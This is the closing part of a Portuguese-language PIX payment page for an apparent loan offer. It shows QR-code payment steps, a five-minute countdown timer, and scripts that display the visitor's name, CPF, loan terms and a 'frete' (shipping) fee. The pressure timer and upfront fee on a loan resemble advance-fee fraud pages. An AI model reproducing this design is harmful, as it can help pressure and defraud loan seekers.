       <div style="background: #fff; padding: 15px; border-radius: 6px; margin-bottom: 20px;">
           <h3 style="color: #4a5568; margin-top: 0;">Opção 2: Usando outro celular</h3>
           <ol style="color: #4a5568; padding-left: 20px; list-style-type: decimal;">
               <li style="margin-bottom: 10px;">Abra o aplicativo do seu banco</li>
               <li style="margin-bottom: 10px;">Procure a opção "PIX" ou "Pagar com PIX"</li>
               <li style="margin-bottom: 10px;">Selecione "Ler QR Code" ou o ícone da câmera</li>
               <li style="margin-bottom: 10px;">Aponte a câmera do celular para o QR Code exibido acima</li>
               <li style="margin-bottom: 10px;">Confira os dados e confirme o pagamento</li>
           </ol>
       </div>
         
  
       <div style="background: #f7fafc; padding: 15px; border-radius: 6px; border-left: 4px solid #4299e1;">
           <p style="color: #4a5568; margin: 0;">
               <strong>Importante:</strong> Após realizar o pagamento, aguarde a confirmação. 
               O sistema verificará automaticamente seu pagamento a cada 10 segundos.
               Você também pode clicar em "Verificar Pagamento" para uma verificação manual.
           </p>
       </div>
   </div>      
                       
      </div>
      
      
      
      
                            
                      
                      
                      
                      
                      
                      
                      
                      
                      
                      
                      
                      
                      
                      <!-- CHECKOUT, VSL OU PIXEL AQUI EM BAIXO -->
    </div>


                    </div>
                   
                  <br>
                    
                    <!--]-->
                  </div>
                </div>
                <!--]-->
              </main>
         
         

    <footer style="margin: 0; padding: 0; background-color: #000; color: #fff; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 200px;">
        <div style="text-align: center;">
            
            <p style="margin: 0; font-size: 14px; line-height: 1.5;"></p>
            <p style="margin: 0; font-size: 14px; line-height: 1.5;"></p>
        </div>
    </footer>
            </div>
          </div>
          <script>
            const totalSeconds = 5 * 60;
            function updateCountdown() {
                const now = Date.now();
                const endTime = parseInt(localStorage.getItem('endTime'), 10);
                let remainingTime = Math.max((endTime - now) / 1000, 0);
    
                const minutes = Math.floor(remainingTime / 60);
                const seconds = Math.floor(remainingTime % 60);
    
                document.getElementById('minutes-count').textContent = minutes < 10 ? '0' + minutes : minutes;
                document.getElementById('seconds-count').textContent = seconds < 10 ? '0' + seconds : seconds;
    
                if (remainingTime <= 0) {
                    clearInterval(interval);
                    localStorage.removeItem('endTime');
                }
            }
    
            function startCountdown() {
                const endTime = Date.now() + totalSeconds * 1000;
                localStorage.setItem('endTime', endTime);
                interval = setInterval(updateCountdown, 1000);
            }
            if (localStorage.getItem('endTime')) {
                interval = setInterval(updateCountdown, 1000);
            } else {
                startCountdown();
            }
        </script>
            <script>
              document.querySelectorAll('.faq-item .question').forEach(item => {
                  item.addEventListener('click', function() {
                      const answer = this.nextElementSibling;
                      this.classList.toggle('expanded');
                      if (this.classList.contains('expanded')) {
                          answer.style.maxHeight = '266px';
                      } else {
                          answer.style.maxHeight = '0';
                      }
                  });
              });
          </script>
    <script>
          let now = new Date();
let day = now.getDate() < 10 ? '0' + now.getDate() : now.getDate();
let month = (now.getMonth() + 1) < 10 ? '0' + (now.getMonth() + 1) : (now.getMonth() + 1);
let year = now.getFullYear();

//document.getElementById('now-date').innerHTML = `${day}/${month}/${year}`;
//document.getElementById('parcelado').innerHTML = localStorage.getItem('parcelado')
//document.getElementById('parcela').innerHTML = localStorage.getItem('parcela')
//document.getElementById('loan').innerHTML = parseFloat(localStorage.getItem('loan')).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' })
          
          // Recuperar o valor de 'parcela' do localStorage
   document.addEventListener('DOMContentLoaded', function() {
  // Captura o valor armazenado
  var loanValue = localStorage.getItem('loanValue'); // ou sessionStorage.getItem('loanValue');

  // Verifica se o valor existe
  if (loanValue) {
    // Define o valor no elemento com ID 'loan'
    document.getElementById('loan').textContent = loanValue;
  } else {
    console.log('O valor do loan não foi encontrado no localStorage.');
  }
});
          
          </script>
           <script>
            document.addEventListener('DOMContentLoaded', () => {
                const loanElement = document.getElementById('loan');
                const parceladoElement = document.getElementById('parcelado');
                const parcelaElement = document.getElementById('parcela');
                const nomeElement = document.getElementById('2b08e5ab-b414-4907-5460-9b99f1920ef0');
                const cpfElement = document.getElementById('ec6b4e34-afc8-2cc7-834f-ef9ae5322fff');
            
                // Função para carregar os valores salvos no localStorage
                function updateDisplay() {
                    const savedLoanAmount = localStorage.getItem('loanAmount');
                    const savedInstallments = localStorage.getItem('installments');
                    const savedMonthlyPayment = localStorage.getItem('MonthlyPayment');
                    const savednome = localStorage.getItem('nome');
                    const savedcpf = localStorage.getItem('cpf');
               
                if (savedcpf) {
                    cpfElement.textContent = `${savedcpf}`;
                }
                    if (savednome) {
                    nomeElement.textContent = `${savednome}`;
                    }
                    if (savedLoanAmount) {
                        loanElement.textContent = `R$ ${savedLoanAmount}`;
                    }
            
                    if (savedInstallments) {
                        parceladoElement.textContent = savedInstallments;
                    }
            
                    if (savedMonthlyPayment) {
                        parcelaElement.textContent = `R$ ${savedMonthlyPayment}`;
                    }
                }
            
                // Carrega os valores salvos no localStorage, se existirem
                updateDisplay();
            });
            </script>
            
            
<script>
let freteValor = localStorage.getItem('freteValor');

// Atualizar a <div> com o valor formatado, usando o id
document.getElementById('freteValorDisplay').textContent = freteValor;
</script>

</body></html>